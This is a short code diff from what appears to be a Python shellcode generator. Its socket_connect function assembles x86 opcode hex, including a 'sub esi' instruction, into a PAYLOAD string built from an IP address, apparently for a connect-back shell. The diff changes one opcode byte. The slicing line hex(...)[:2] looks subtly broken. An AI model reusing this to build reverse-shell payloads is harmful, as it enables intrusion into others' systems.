@@ -218,7 +218,7 @@ def socket_connect(ip, port):
         # print(hex(ip_greater[i])[2:])
 
 
-    add_string += "83ee" # sub esi
+    add_string += "81ee" # sub esi
     for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[:2]
